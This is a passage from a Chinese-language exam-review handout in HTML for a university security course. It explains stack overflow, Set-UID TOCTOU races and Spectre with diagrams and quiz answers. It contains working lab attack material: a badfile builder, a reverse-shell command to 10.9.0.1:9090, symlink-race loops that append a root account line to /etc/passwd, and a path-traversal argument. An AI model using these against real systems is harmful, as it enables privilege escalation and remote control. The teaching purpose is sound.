@@ -1,0 +1,814 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>SFS 期末复习讲义：六类攻击的原理、代码与小测考点</title>
+<style>
+  @page { size: A4; margin: 15mm 14mm 13mm 14mm; }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    font-family: "Microsoft YaHei", "Segoe UI", sans-serif;
+    font-size: 9.4pt;
+    line-height: 1.62;
+    color: #111;
+  }
+  h1 { font-size: 19pt; margin: 0 0 2mm 0; letter-spacing: 0.5pt; }
+  .sub { color: #555; font-size: 9pt; margin-bottom: 6mm; border-bottom: 1.5pt solid #111; padding-bottom: 3mm; }
+  h2 {
+    font-size: 14pt;
+    margin: 8mm 0 2.5mm 0;
+    padding: 1.5mm 1mm 1.5mm 3mm;
+    border-left: 4pt solid #111;
+    background: #f2f2f2;
+    break-after: avoid;
+  }
+  h3 { font-size: 11pt; margin: 4.5mm 0 1.5mm 0; break-after: avoid; }
+  h4 { font-size: 9.8pt; margin: 3mm 0 1mm 0; color: #333; break-after: avoid; }
+  p { margin: 1.2mm 0; text-align: justify; }
+  ul, ol { margin: 1mm 0 1.5mm 0; padding-left: 5.5mm; }
+  li { margin: 0.6mm 0; }
+  code {
+    font-family: Consolas, "Cascadia Mono", monospace;
+    font-size: 8.5pt;
+    background: #f0f0f0;
+    padding: 0.2mm 1mm;
+    border-radius: 0.6mm;
+  }
+  pre {
+    font-family: Consolas, "Cascadia Mono", monospace;
+    font-size: 8.2pt;
+    line-height: 1.38;
+    margin: 1.5mm 0;
+    padding: 2mm 2.5mm;
+    background: #f7f7f7;
+    border-left: 2.5pt solid #444;
+    white-space: pre-wrap;
+    word-break: break-all;
+    break-inside: avoid;
+  }
+  .fig { margin: 2.5mm 0 3mm 0; text-align: center; break-inside: avoid; }
+  .fig svg { width: 100%; height: auto; display: block; }
+  .cap { font-size: 8.3pt; color: #555; margin-top: 1.2mm; text-align: center; }
+  .note {
+    background: #fff8e1;
+    border-left: 3pt solid #d69e00;
+    padding: 1.5mm 3mm;
+    margin: 2.5mm 0;
+    break-inside: avoid;
+  }
+  .quiz {
+    background: #eef4ff;
+    border-left: 3pt solid #2b6cb0;
+    padding: 1.5mm 3mm;
+    margin: 2.5mm 0;
+    break-inside: avoid;
+  }
+  .quiz::before { content: "小测考点"; display: block; font-weight: 700; font-size: 8.4pt; color: #2b6cb0; letter-spacing: 0.5pt; margin-bottom: 0.8mm; }
+  .def { background: #f4f4f4; padding: 1.5mm 3mm; margin: 2mm 0; break-inside: avoid; }
+  .def b { color: #000; }
+  table { width: 100%; border-collapse: collapse; font-size: 8.6pt; margin: 2mm 0; break-inside: avoid; }
+  th { background: #222; color: #fff; text-align: left; padding: 1.2mm 1.5mm; font-weight: 600; }
+  td { border-bottom: 0.3pt solid #ccc; padding: 1.2mm 1.5mm; vertical-align: top; }
+  tr:nth-child(even) td { background: #fafafa; }
+  .two { column-count: 2; column-gap: 6mm; }
+  .key { font-weight: 700; }
+  .red { color: #b00020; font-weight: 700; }
+  .blue { color: #1d4ed8; }
+  .small { font-size: 8.4pt; }
+  hr { border: none; border-top: 0.3pt solid #ddd; margin: 4mm 0; }
+</style>
+</head>
+<body>
+
+<h1>SFS 期末复习讲义</h1>
+<div class="sub">六类攻击的<b>原理 → 图示 → 代码 → 小测考点</b>　·　依据：LAB2–LAB7 实验报告、5 次小测题目与答案、LAB6/LAB7 官方实验指导</div>
+
+<h2>0　一张表看懂整个学期</h2>
+<table>
+<tr><th style="width:13%">实验</th><th style="width:24%">漏洞落在哪</th><th style="width:31%">攻击者要做什么</th><th style="width:32%">一句话原理</th></tr>
+<tr><td>LAB2</td><td><code>strcpy(buffer, str)</code> 不检查长度</td><td>构造 badfile，覆盖返回地址跳到 shellcode</td><td>数据溢出改写了「控制数据」（返回地址）</td></tr>
+<tr><td>LAB3</td><td><code>access()</code> 与 <code>fopen()</code> 之间</td><td>在两次调用之间把 <code>/tmp/XYZ</code> 换成软链</td><td>检查与使用不在同一时刻（TOCTOU）</td></tr>
+<tr><td>LAB3′</td><td>前缀比较 / fd 继承 / 环境变量</td><td>路径穿越、猜 fd 写、改 <code>REPORT_AUDIT</code></td><td>把「受控输入」当成了权限判定依据</td></tr>
+<tr><td>LAB4</td><td>CPU 乱序执行 + cache</td><td>训练分支预测后越界读，再用计时还原数据</td><td>被丢弃的执行结果留下了缓存痕迹</td></tr>
+<tr><td>LAB5</td><td><code>printf(msg)</code> 直接当格式串</td><td><code>%x</code> 泄漏、<code>%n</code> 写内存、覆盖返回地址</td><td>数据被当成了「指令」</td></tr>
+<tr><td>LAB6</td><td>profile 字段未转义</td><td>注入 <code>&lt;script&gt;</code>，读 token 后伪造请求、自我复制</td><td>数据被浏览器当成了「代码」</td></tr>
+<tr><td>LAB7</td><td>SQL 字符串拼接</td><td><code>admin'#</code> 绕过登录、UPDATE 注入改工资</td><td>数据被数据库当成了「语句」</td></tr>
+</table>
+<p class="small">注意最后四行的共同点：<span class="key">代码与数据的边界消失</span>。能说清「边界在哪、怎么消失的、怎么恢复」，三道 Web 题都能拿满分。</p>
+
+<h2>1　栈溢出：把返回地址改成我的代码</h2>
+
+<h3>1.1 原理：函数是怎么「返回」的</h3>
+<p>函数调用时，CPU 把「返回后该执行哪条指令」的地址（<span class="key">返回地址 ret</span>）压在栈上，再把旧的 <code>ebp</code> 压栈，然后给局部变量分配空间。函数结束时执行 <code>leave; ret</code>：<code>ret</code> 就是把栈顶那 4/8 个字节<b>当作地址</b>跳过去。</p>
+<p>问题出在 <code>strcpy(buffer, str)</code>：它只管复制到 <code>\0</code> 为止，<b>完全不看 buffer 有多大</b>。只要 <code>str</code> 比 buffer 长，多出来的字节就会沿着栈往上写，依次盖掉「保存的 ebp」和「返回地址」。</p>
+
+<div class="fig">
+<svg viewBox="0 0 700 330" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="13">
+  <defs>
+    <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 z" fill="#333"/>
+    </marker>
+    <marker id="arr" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto">
+      <path d="M0,0 L7,3 L0,6 z" fill="#b00020"/>
+    </marker>
+  </defs>
+  <text x="20" y="30" fill="#666" font-size="12">高地址</text>
+  <rect x="255" y="34" width="230" height="44" fill="#f0f0f0" stroke="#333"/>
+  <text x="370" y="61" text-anchor="middle">调用者的栈帧</text>
+
+  <rect x="255" y="78" width="230" height="40" fill="#ffd9d9" stroke="#b00020" stroke-width="2"/>
+  <text x="370" y="103" text-anchor="middle" fill="#b00020" font-weight="700">返回地址 ret（4/8 字节）</text>
+  <text x="495" y="86" font-size="12">← ebp + 4</text>
+  <text x="495" y="104" font-size="12" fill="#b00020">被溢出改写 ⇒ 控制流被劫持</text>
+
+  <rect x="255" y="118" width="230" height="36" fill="#fff3cd" stroke="#333"/>
+  <text x="370" y="141" text-anchor="middle">保存的 ebp</text>
+  <text x="495" y="132" font-size="12">← ebp 指向这里</text>
+
+  <rect x="255" y="154" width="230" height="104" fill="#dbe9ff" stroke="#333"/>
+  <text x="370" y="200" text-anchor="middle">buffer[100]</text>
+  <text x="370" y="220" text-anchor="middle" font-size="12" fill="#555">strcpy 从低地址往高地址灌数据</text>
+  <text x="495" y="162" font-size="12">← buffer 起始（buf）</text>
+  <text x="20" y="275" fill="#666" font-size="12">低地址</text>
+
+  <line x1="245" y1="154" x2="245" y2="118" stroke="#b00020" stroke-width="2" marker-start="url(#arr)"/>
+  <line x1="245" y1="118" x2="245" y2="78" stroke="#b00020" stroke-width="2"/>
+  <text x="18" y="122" font-size="12.5" fill="#b00020" font-weight="700">offset 从 buf 量到 ret：</text>
+  <text x="18" y="142" font-size="12.5" fill="#b00020">offset = (ebp − buf) + 4</text>
+  <text x="18" y="160" font-size="11" fill="#b00020">（64 位把 +4 换成 +8）</text>
+
+  <path d="M255,270 L520,270" stroke="#555" stroke-width="1.2" marker-end="url(#ar)"/>
+  <text x="230" y="292" font-size="12" fill="#555">strcpy 复制方向（覆盖顺序）</text>
+</svg>
+<div class="cap">图 1　栈帧布局与 offset 的由来：buffer 到 ret 之间只隔着「保存的 ebp」</div>
+</div>
+
+<div class="def">
+<b>核心公式</b>：<code>offset = (ebp − buffer) + 4</code>（32 位）；64 位把 <code>+4</code> 换成 <code>+8</code>，因为 ret 占 8 字节。<br>
+<b>小测原题代入</b>：程序打印 <code>buffer = 0x00BBCC00</code>、<code>ebp = 0x00BBCD00</code> → <code>offset = 0xBBCD00 − 0xBBCC00 + 4 = 0x104</code>，也就是第 260 字节开始写返回地址。
+</div>
+
+<h3>1.2 代码：badfile 是怎么拼出来的</h3>
+<p>攻击脚本不发送字符串，而是生成一个二进制文件 <code>badfile</code>（517 字节），再由程序读进 <code>str</code> 交给 <code>strcpy</code>。它由四段拼成：</p>
+
+<div class="fig">
+<svg viewBox="0 0 700 190" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="12.5">
+  <defs>
+    <marker id="a2" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 z" fill="#b00020"/></marker>
+  </defs>
+  <text x="10" y="24" font-size="11" fill="#666">偏移 0</text>
+  <text x="640" y="24" font-size="11" fill="#666">517</text>
+
+  <rect x="40" y="40" width="300" height="46" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="190" y="69" text-anchor="middle" fill="#2e7d32" font-weight="700">NOP sled（0x90 填充）</text>
+
+  <rect x="340" y="40" width="150" height="46" fill="#fff3cd" stroke="#8a6d00"/>
+  <text x="415" y="62" text-anchor="middle" font-size="11.5">shellcode</text>
+  <text x="415" y="78" text-anchor="middle" font-size="10.5" fill="#666">（放尾部，紧跟 NOP 区）</text>
+
+  <rect x="490" y="40" width="90" height="46" fill="#f0f0f0" stroke="#888"/>
+  <text x="535" y="69" text-anchor="middle" font-size="11">填充</text>
+
+  <rect x="580" y="40" width="60" height="46" fill="#ffd9d9" stroke="#b00020" stroke-width="2"/>
+  <text x="610" y="62" text-anchor="middle" font-size="11" fill="#b00020" font-weight="700">ret</text>
+  <text x="610" y="77" text-anchor="middle" font-size="9.5" fill="#b00020">4/8 字节</text>
+
+  <line x1="610" y1="92" x2="610" y2="130" stroke="#b00020" stroke-width="1.5"/>
+  <line x1="610" y1="130" x2="250" y2="130" stroke="#b00020" stroke-width="1.5" marker-end="url(#a2)"/>
+  <text x="300" y="150" font-size="11.5" fill="#b00020">返回地址指向 NOP sled 中间（不要指太前也不要太后）</text>
+  <text x="300" y="170" font-size="11" fill="#666">落在 sled 里任意一格都能滑到 shellcode → 容忍地址误差</text>
+</svg>
+<div class="cap">图 2　badfile 的四段结构：NOP sled + shellcode + 填充 + 覆盖用的返回地址</div>
+</div>
+
+<pre>content = bytearray(0x90 for i in range(517))      # ① 先全填 NOP
+start = 517 - len(shellcode)                        # ② shellcode 贴尾部
+content[start:start+len(shellcode)] = shellcode
+ret = 0xffffd398                                    # ③ 指向 sled 中部
+content[116:120] = (ret).to_bytes(4,'little')       # ④ 在 offset 处写 ret（小端）</pre>
+
+<p><span class="key">为什么用 NOP sled？</span>因为 ASLR 关闭时地址虽固定，但只要 shellcode 前面铺满 <code>0x90</code>，返回地址只要是「sled 里任意一格」就能安全滑到 shellcode，容错率大幅提高。</p>
+
+<h3>1.3 四个关卡，其实是同一种攻击的四种「不确定性」</h3>
+<table>
+<tr><th style="width:8%">关卡</th><th style="width:46%">新的困难</th><th style="width:46%">解决办法</th></tr>
+<tr><td>L1</td><td>无（32 位、地址固定）</td><td>直接算 <code>offset=116</code>，ret 取 buffer 附近地址</td></tr>
+<tr><td>L2</td><td>buffer 只有 100 字节，但输入有 517 字节，地址只能猜</td><td>把 <code>[100,256)</code> <b>整段都填成同一个 ret</b>（<code>for o in range(100,256,4)</code>），ret 取 <code>buf+256</code>——不管实际偏移是多少都能命中</td></tr>
+<tr><td>L3</td><td>64 位；地址里含 <code>\x00</code>，<code>strcpy</code> 遇到就停</td><td>把 shellcode 放到 <b>最前面</b>（<code>start=0</code>），让 <code>\x00</code> 出现在最后一个字节之后；<code>offset=216</code>（rbp−buf=208，+8）</td></tr>
+<tr><td>L4</td><td>开了 ASLR，栈地址每次变</td><td>只能暴力：栈地址低 16 位随机但范围有限，按页猜、反复试（实验里未成功，说明 ASLR 有效）</td></tr>
+</table>
+<pre># 反弹 shell：把命令串换掉即可，末尾 * 的位置不能动（shellcode 会把它改成 \0）
+"/bin/bash -i >& /dev/tcp/10.9.0.1/9090 0<&1 2>&1          *"</pre>
+
+<h3>1.4 小测原题（投屏那道）</h3>
+<div class="quiz">
+<p><b>Q1（10 分）程序如何获取 str 与 buffer 的地址？</b><br>
+程序里 <code>printf("buffer: %p, ebp: %p")</code> 之类把 <code>buffer</code> 与 <code>ebp</code> 打印出来；<code>str</code> 是接收输入的缓冲区，地址 = <code>buffer</code> 本身，<code>buffer</code> 与 ret 之间的差由 <code>ebp</code> 给出。答辩时要说清楚：<b>打印这两个值就等于把栈布局告诉了攻击者</b>，这是信息泄漏。</p>
+<p><b>Q2（60 分）构造一次成功的输入</b>：题目只给了 <code>buffer = 0xAABB8D00</code>，<code>ebp = 0xAABB8**0</code>——<b>ebp 被打码了</b>，说明帧大小不确定。所以不能只写一个 ret，而要<span class="red">把所有可能的返回地址槽位都填成同一个跳转地址</span>：<code>ret = 0xAABB8D24 + 0x10·n</code>，跳转目标取 <code>0xAABB9004</code>，shellcode 放最后 <code>[960,1000]</code>，其余全填 NOP。要点：① 用栈示意图说明 buffer/ebp/ret 三层；② 说明 <b>为什么「全部填满」比「精确算一个」更稳</b>；③ 小端字节序。</p>
+<p><b>Q3（30 分）地址完整给出时</b>：<code>buffer = 0x00BBCC00</code>、<code>ebp = 0x00BBCD00</code> → <code>offset = 0x104</code>，ret 写 <code>0x00BBCC04</code>（buffer+4，指向自己的 shellcode 区），shellcode 放 payload 开头 <code>[4, …]</code>，中间填 NOP。</p>
+</div>
+
+<h3>1.5 防御：三道关卡分别拦住什么</h3>
+<ul>
+<li><b>StackGuard（canary）</b>：在 ret 前插入随机哨兵值，函数返回前校验；被溢出改写 → 报 <code>stack smashing detected</code> 并 abort。<b>拦住「覆盖 ret」这件事本身</b>。</li>
+<li><b>NX / DEP</b>（编译时去掉 <code>-z execstack</code>）：栈不可执行，跳到栈上的 shellcode 直接 SIGSEGV。<b>拦住「执行注入代码」</b>，但改 ret 仍可 ROP。</li>
+<li><b>ASLR / PIE</b>：栈与代码地址随机化，攻击者不知道往哪跳，只能爆破或先泄漏地址。</li>
+</ul>
+
+<h2>2　Set-UID 与 TOCTOU：检查的和使用的不是同一个东西</h2>
+
+<h3>2.1 先搞清楚 Set-UID 的两个身份</h3>
+<div class="def">
+<b>真实 UID（real UID）</b>：你是谁，<code>getuid()</code>，由启动进程的用户决定。<br>
+<b>有效 UID（effective UID）</b>：系统<b>按谁的身份给你判权限</b>，<code>geteuid()</code>。<br>
+Set-UID 程序（<code>chmod 4755</code>）被 seed 执行时：real = 1000(seed)，<b>effective = 0(root)</b>。所以它内部做任何文件操作都按 root 判权限——<b>所有漏洞的严重性都来自这一句</b>。
+</div>
+<p>vulp 程序的逻辑：先用 <code>access(fn, W_OK)</code> 判断「我能不能写」，通过后用 <code>fopen(fn, "a+")</code> 打开。看起来无懈可击，但这两个调用用的身份不一样：</p>
+<ul>
+<li><code>access()</code> 用的是<b>真实 UID（seed）</b>——所以普通文件能通过检查；</li>
+<li><code>fopen()</code> 用的是<b>有效 UID（root）</b>——所以它能写 root 的文件。</li>
+</ul>
+<p>两者之间隔着一个<b>时间窗口</b>。攻击者要做的，就是在这个窗口里把 <code>/tmp/XYZ</code> 从「自己的普通文件」换成「指向 <code>/etc/passwd</code> 的软链」。</p>
+
+<div class="fig">
+<svg viewBox="0 0 720 300" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="12">
+  <defs>
+    <marker id="a3" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 z" fill="#333"/></marker>
+  </defs>
+  <line x1="70" y1="40" x2="70" y2="255" stroke="#333" stroke-width="1.5" marker-end="url(#a3)"/>
+  <text x="72" y="272" font-size="11" fill="#666">时间</text>
+  <text x="150" y="30" font-size="12" font-weight="700">vulp（root 权限）</text>
+  <text x="480" y="30" font-size="12" font-weight="700">攻击者（seed 权限）</text>
+
+  <rect x="130" y="45" width="240" height="40" rx="4" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="250" y="70" text-anchor="middle">access("/tmp/XYZ", W_OK)</text>
+  <text x="385" y="70" font-size="10.5" fill="#1d4ed8">用 real UID 判 → 通过</text>
+
+  <rect x="130" y="105" width="240" height="40" rx="4" fill="#ffd9d9" stroke="#b00020" stroke-width="2"/>
+  <text x="250" y="130" text-anchor="middle" fill="#b00020" font-weight="700">窗口（TOCTOU）</text>
+
+  <rect x="430" y="105" width="250" height="40" rx="4" fill="#fff3cd" stroke="#8a6d00"/>
+  <text x="555" y="124" text-anchor="middle" font-size="11.5">rm -f /tmp/XYZ</text>
+  <text x="555" y="139" text-anchor="middle" font-size="11.5">ln -s /etc/passwd /tmp/XYZ</text>
+
+  <line x1="430" y1="125" x2="375" y2="125" stroke="#b00020" stroke-width="1.5" marker-end="url(#a3)"/>
+
+  <rect x="130" y="170" width="240" height="40" rx="4" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="250" y="195" text-anchor="middle">fopen("/tmp/XYZ", "a+")</text>
+  <text x="385" y="195" font-size="10.5" fill="#1d4ed8">用 euid=root 判 → 打开软链</text>
+
+  <rect x="130" y="225" width="240" height="36" rx="4" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="250" y="248" text-anchor="middle" font-size="11.5">fprintf 追加 → 写进 /etc/passwd</text>
+  <text x="390" y="248" font-size="10.5" fill="#2e7d32">← 实际被写的是 root 的文件</text>
+</svg>
+<div class="cap">图 3　TOCTOU：检查时刻看到的是 A，使用时刻打开的却是 B</div>
+</div>
+
+<pre>echo "dummy" > /tmp/XYZ                    # ① 先让 access 通过
+rm -f /tmp/XYZ                             # ② 窗口期：删掉
+ln -s /etc/passwd /tmp/XYZ                 #    换成指向 /etc/passwd 的软链
+# ③ 程序 fopen 时以 root 打开 → 追加成功</pre>
+<p>手工敲命令抢窗口太慢，稳定做法是写个循环不停地换；而 <code>unlink()+symlink()</code> 本身仍是两步、依然有窗口，所以更稳的是 <code>renameat2(…, RENAME_EXCHANGE)</code>——<b>一次系统调用原子交换两个路径</b>：</p>
+<pre>X = "/tmp/XYZ"; A = "/tmp/ABC"
+unlink(X); symlink("/dev/null", X);        # XYZ 指向无害文件
+unlink(A); symlink("/etc/passwd", A);      # ABC 指向目标
+while (1) renameat2(0, X, 0, A, RENAME_EXCHANGE);   # 原子地来回换</pre>
+<p>追加到 <code>/etc/passwd</code> 的那一行，就是攻击者拿到 root 的方式（密码哈希留空，UID 填 0）：</p>
+<pre>test:U6aMy0wojraho:0:0:test:/root:/bin/bash</pre>
+
+<h3>2.2 防御一：最小权限（改程序）</h3>
+<p>思路：<b>让检查和打开都以 seed 的身份完成，只在真正要写的时候短暂提权</b>，而且写之前已经拿到 fd，路径再怎么换也没用。</p>
+<pre>uid_t real = getuid(), eff = geteuid();
+seteuid(real);                     // ① 降权：access 和 fopen 都以 seed 身份执行
+if (!access(fn, W_OK)) {
+    fp = fopen(fn, "a+");          // 此时即使 fn 变成软链，也以 seed 身份打开 → 失败
+    seteuid(eff);                  // ② 打开成功后才提权
+    fwrite(...); fclose(fp);
+    seteuid(real);                 // ③ 写完立刻降回
+}</pre>
+
+<h3>2.3 防御二：<code>fs.protected_symlinks=1</code>（改内核）</h3>
+<p>内核在<b>跟随软链</b>时额外做三个检查，只有「同时满足」才拒绝：</p>
+<ul>
+<li>① 软链所在目录是<b>全局可写 + 粘滞位</b>（如 <code>/tmp</code>，权限 <code>1777</code>）；</li>
+<li>② 软链的属主与进程<b>有效 UID 不一致</b>；</li>
+<li>③ 软链所在目录的属主与进程<b>有效 UID 也不一致</b>。</li>
+</ul>
+<p><span class="key">局限性（考试爱问）</span>：只保护 sticky 的世界可写目录；只防<b>符号链接</b>不防<b>硬链接</b>；依赖属主比较（若攻击者与目标同属主就失效）；<b>不防其它类型的 TOCTOU</b>（比如换文件内容而不是换链接）。</p>
+
+<h3>2.4 小测 A：lstat 判类型的那个程序</h3>
+<div class="quiz">
+<p><b>题目</b>：root 拥有、Set-UID，只允许给「调用者本人的普通文件」追加输入。代码用 <code>lstat(fn,&amp;st)</code> 检查 <code>S_ISREG</code> 与 <code>st.st_uid == getuid()</code>，通过后 <code>fopen(fn,"a")</code> 写入。程序员说：「拒绝了软链又查了属主，所以不可能改 root 的文件。」</p>
+<p><b>(a) 说法对吗？A、C 执行时 XYZ 应指向什么？</b>　错。<span class="blue">A（lstat 时）</span>必须让它指向 <b>seed 自己的普通文件</b>，否则检查不过；<span class="blue">C（fopen 时）</span>则应指向 <b>/etc/protected</b>——中间被换掉了。检查的和使用的是两个不同的对象，这就是全部问题。</p>
+<p><b>(b) 构造执行时序</b>：<code>touch /tmp/quiz/XYZ</code>（普通文件，uid=1000）→ 程序 <code>lstat</code> 通过 → 攻击者 <code>rm XYZ; ln -s /etc/protected XYZ</code> → 程序 <code>fopen(fn,"a")</code> 以 root 打开 <code>/etc/protected</code> 并写入。</p>
+<p><b>(c) C 前再加一次 lstat 能消除漏洞吗？</b>　不能。仍在「最后一次 lstat → fopen」之间留窗口，只是窗口更窄、更难抢；<b>只要检查和使用是两个按名字进行的独立系统调用，就永远有 TOCTOU</b>。</p>
+<p><b>(d) 在 C 之后、D 之前替换 XYZ，能写到另一个文件吗？</b>　不能。D 用的是已经拿到的 <code>fp</code>，它<b>绑定的是打开那一刻的 inode</b>，与路径名再无关系。启示：应该用 <code>fstat(fileno(fp), &amp;st)</code> 校验<b>已经打开的 fd</b>，而不是校验文件名。</p>
+</div>
+
+<h3>2.5 小测 B：reportdesk 的三个洞</h3>
+<div class="quiz">
+<p><b>① 前缀比较可穿越</b>：<code>if (strncmp(argv[1], "/opt/lab/reports/", 17) != 0) return 1;</code> 只比较前 17 个字符，于是<br>
+<code>argv[1] = "/opt/lab/reports/../../../etc/passwd"</code> 能通过检查，随后 <code>open(argv[1], O_RDONLY)</code> 读出 <b>任意文件</b>。修法：用 <code>realpath()</code> 规范化后再比，或用 <code>openat</code>。  </p>
+<p><b>② logfd 泄漏</b>：<code>open(audit, …)</code> 得到的 fd 若<b>没有</b> <code>O_CLOEXEC</code>，会随 <code>execve</code> 被 shell 继承，于是 <code>echo "Hello World!" &gt;&amp;3</code> 就能<b>以 root 身份写任意文件</b>。本题代码带了 <code>O_CLOEXEC</code>，所以这一条<b>不成立</b>——答题时要把这个判断说出来。</p>
+<p><b>③ REPORT_AUDIT 可控</b>：<code>getenv("REPORT_AUDIT")</code> 由用户环境变量决定，把它设成 <code>/etc/passwd</code>，程序就会把 <code>"VIEW\n"</code> 追加进去，污染任意文件。修法：白名单固定路径，不信任 env。</p>
+</div>
+
+<h2>3　Spectre 与 Meltdown：靠「时间差」偷数据</h2>
+
+<h3>3.1 前置知识：为什么时间能泄漏信息</h3>
+<p>CPU 访问内存时，<b>命中 cache</b> 只要几十个周期，<b>没命中</b>要走内存，要几百个周期。于是「某块数据快不快」就暴露了「它有没有被访问过」。</p>
+<p><span class="key">Flush+Reload</span> 是最常用的手法，三步：① 用 <code>_mm_clflush(&amp;addr)</code> 把目标从 cache 里踢掉；② 触发受害代码；③ 用 <code>clock_gettime</code> 计时重新读它——<b>快就说明受害代码在 ② 里碰过它</b>。</p>
+<div class="fig">
+<svg viewBox="0 0 700 150" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="12">
+  <defs><marker id="a4" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 z" fill="#333"/></marker></defs>
+  <rect x="30" y="35" width="180" height="48" rx="4" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="120" y="56" text-anchor="middle" font-size="11.5">clflush(&amp;addr)</text>
+  <text x="120" y="72" text-anchor="middle" font-size="10.5" fill="#1d4ed8">把 addr 逐出 cache</text>
+
+  <rect x="255" y="35" width="180" height="48" rx="4" fill="#fff3cd" stroke="#8a6d00"/>
+  <text x="345" y="56" text-anchor="middle" font-size="11.5">触发受害代码</text>
+  <text x="345" y="72" text-anchor="middle" font-size="10.5" fill="#8a6d00">可能把 addr 读回来</text>
+
+  <rect x="480" y="35" width="190" height="48" rx="4" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="575" y="56" text-anchor="middle" font-size="11.5">t = time(reload addr)</text>
+  <text x="575" y="72" text-anchor="middle" font-size="10.5" fill="#2e7d32">t 小 → 被访问过</text>
+
+  <line x1="210" y1="59" x2="250" y2="59" stroke="#333" stroke-width="1.5" marker-end="url(#a4)"/>
+  <line x1="435" y1="59" x2="475" y2="59" stroke="#333" stroke-width="1.5" marker-end="url(#a4)"/>
+
+  <text x="30" y="115" font-size="11">实测阈值：本实验测得 <tspan font-weight="700">≈81</tspan>（命中约 20~30，未命中 200+）。用 81 判命中/未命中，20 次全部成功；改成 60 就有失败。</text>
+  <text x="30" y="136" font-size="11">实验环境不支持 <tspan font-family="Consolas">__rdtscp</tspan>，全部改用 <tspan font-family="Consolas">clock_gettime</tspan> 计时。</text>
+</svg>
+<div class="cap">图 4　Flush+Reload：把「有没有被访问」变成「读得快不快」</div>
+</div>
+
+<h3>3.2 Spectre：训练分支预测，让它替我越界读</h3>
+<p>程序里有个越界访问 <code>if (x &lt; array_size) array[x]</code>，正常永远进不去。但 CPU 的<b>分支预测</b>会猜「条件成立」，于是<b>提前</b>把 <code>array[x*4096 + DELTA]</code> 读进 cache；等发现猜错时，结果被丢弃、寄存器回滚——<b>但 cache 里的痕迹不会回滚</b>。我们只要逐页 reload，看哪一页最快，就知道 <code>array_size</code> 后面的秘密字节是多少。</p>
+
+<div class="fig">
+<svg viewBox="0 0 720 210" xmlns="http://www.w3.org/2000/svg" font-family="Microsoft YaHei" font-size="11.5">
+  <defs><marker id="a5" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L7,3 L0,6 z" fill="#333"/></marker></defs>
+  <rect x="10" y="30" width="160" height="86" rx="5" fill="#dbe9ff" stroke="#1d4ed8"/>
+  <text x="90" y="52" text-anchor="middle" font-weight="700" fill="#1d4ed8">① 训练</text>
+  <text x="90" y="72" text-anchor="middle" font-size="10.5">循环 10 次</text>
+  <text x="90" y="88" text-anchor="middle" font-size="10.5">victim(i), i 合法</text>
+  <text x="90" y="104" text-anchor="middle" font-size="10.5">+ clflush(&amp;size)</text>
+
+  <rect x="190" y="30" width="160" height="86" rx="5" fill="#fff3cd" stroke="#8a6d00"/>
+  <text x="270" y="52" text-anchor="middle" font-weight="700" fill="#8a6d00">② 越界触发</text>
+  <text x="270" y="72" text-anchor="middle" font-size="10.5">传 x = larger</text>
+  <text x="270" y="88" text-anchor="middle" font-size="10.5">CPU 预测「仍为小」</text>
+  <text x="270" y="104" text-anchor="middle" font-size="10.5">提前执行越界读</text>
+
+  <rect x="370" y="30" width="160" height="86" rx="5" fill="#ffd9d9" stroke="#b00020"/>
+  <text x="450" y="52" text-anchor="middle" font-weight="700" fill="#b00020">③ 留下痕迹</text>
+  <text x="450" y="72" text-anchor="middle" font-size="10.5">array[s*4096+DELTA]</text>
+  <text x="450" y="88" text-anchor="middle" font-size="10.5">被读进 cache</text>
+  <text x="450" y="104" text-anchor="middle" font-size="10.5">（结果被丢弃）</text>
+
+  <rect x="550" y="30" width="160" height="86" rx="5" fill="#e8f5e9" stroke="#2e7d32"/>
+  <text x="630" y="52" text-anchor="middle" font-weight="700" fill="#2e7d32">④ 还原</text>
+  <text x="630" y="72" text-anchor="middle" font-size="10.5">reload 256 页</text>
+  <text x="630" y="88" text-anchor="middle" font-size="10.5">取时间最短的 i</text>
+  <text x="630" y="104" text-anchor="middle" font-size="10.5">= 秘密字节</text>
+
+  <line x1="170" y1="72" x2="186" y2="72" stroke="#333" stroke-width="1.5" marker-end="url(#a5)"/>
+  <line x1="350" y1="72" x2="366" y2="72" stroke="#333" stroke-width="1.5" marker-end="url(#a5)"/>
+  <line x1="530" y1="72" x2="546" y2="72" stroke="#333" stroke-width="1.5" marker-end="url(#a5)"/>
+
+  <rect x="10" y="140" width="700" height="56" rx="4" fill="#f4f4f4" stroke="#bbb"/>
+  <text x="22" y="160" font-size="10.5">关键：③ 里的写入发生在「权限检查/分支结果」之前，是 CPU 抢先执行的；等判断出猜错，寄存器回滚，<tspan font-weight="700">但 cache 不会被回滚</tspan>。</text>
+  <text x="22" y="182" font-size="10.5">所以攻击者拿到的不是数据本身，而是「哪一页变快了」——再用 Flush+Reload 翻译成字节。</text>
+</svg>
+<div class="cap">图 5　Spectre 四步：训练 → 越界 → 污染 cache → 计时还原</div>
+</div>
+
+<pre>// ① 训练（循环 10 次，每次先清掉 size 的缓存）
+for (i = 0; i &lt; 10; i++) { _mm_clflush(&amp;size); victim(i); }
+// ② 传一个越界下标；③ CPU 预测「仍小于」，乱序执行 array[s*4096 + DELTA] += 88
+s = restrictedAccess(index_beyond);
+// ④ reload 全部 256 页，得分最高者为秘密字节
+for (i = 1; i &lt; 256; i++) { t = time(array[i*4096 + DELTA]); if (t &lt; 阈值) scores[i]++ }</pre>
+
+<h4>三个「反直觉」的实验现象，正是考点</h4>
+<table>
